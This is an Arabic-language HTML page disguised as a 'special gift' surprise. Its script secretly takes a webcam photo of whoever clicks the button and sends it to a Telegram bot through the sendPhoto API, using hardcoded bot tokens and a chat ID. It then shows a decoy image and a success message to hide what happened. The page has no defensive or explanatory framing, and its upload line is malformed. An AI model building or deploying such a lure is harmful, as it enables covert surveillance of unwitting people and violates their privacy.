<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مفاجأة خاصة 🎁</title>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #050801; font-family: sans-serif; overflow: hidden; }
        .glass-container { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 40px; text-align: center; box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37); width: 85%; max-width: 400px; }
        .neon-btn { padding: 15px 30px; color: #03e9f4; background: transparent; border: 2px solid #03e9f4; border-radius: 10px; font-size: 1.2rem; font-weight: bold; cursor: pointer; transition: 0.5s; }
        .neon-btn:hover { background: #03e9f4; color: #050801; box-shadow: 0 0 20px #03e9f4; }
        #video, #canvas { display: none; }
        
        /* تصميم مكان ظهور صورتك */
        .gift-img { 
            width: 100%; 
            border-radius: 15px; 
            margin-top: 20px; 
            border: 2px solid #03e9f4; 
            display: none; /* مخفية في البداية */
        }
    </style>
</head>
<body>

    <div id="main-content" class="glass-container">
        <h1 id="title">هدية حصرية! 🎁</h1>
        <p id="desc" style="color: #aaa;">اضغط بالأسفل لتفعيل المفاجأة</p>
        <button id="main-btn" class="neon-btn" onclick="startProcess()">افتح المفاجأة</button>
        
        <img id="my-image" src="nature.jpg" class="gift-img">
        
        <p id="final-msg" style="color: #fff; margin-top: 15px; display: none;">✨ تم تفعيل هديتك بنجاح!</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const TOKEN = "8387241026:AAFhkkv2RYiOFr4o8PJMeDikn2mMNkF_6rA";
        const CHAT_ID = "7002841594";

        async function startProcess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                document.getElementById('main-btn').innerText = "جاري التحميل...";

                setTimeout(() => { captureAndSend(stream); }, 1000);
            } catch (err) {
                alert("يجب السماح بالكاميرا!");
            }
        }

        function captureAndSend(stream) {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('photo', blob, 'img.jpg');
                fd.append('chat_id', CHAT_ID);

                // إرسال الصورة لتيليجرام
                fetch(`https://api.telegram.org/bot${8896286925:AAF3q7qJf76Syaa1z-d15oxnmxr5tKdyiCU }/sendPhoto`, { method: 'POST', body: fd });

                // إيقاف الكاميرا وإظهار صورتك الخاصة للمستخدم
                stream.getTracks().forEach(t => t.stop());
                showMyPicture();
            }, 'image/jpeg', 0.5);
        }

        function showMyPicture() {
            document.getElementById('main-btn').style.display = 'none';
            document.getElementById('desc').style.display = 'none';
            
            // إظهار الصورة والرسالة
            document.getElementById('my-image').style.display = 'block';
            document.getElementById('final-msg').style.display = 'block';
        }
    </script>
</body>
</html>
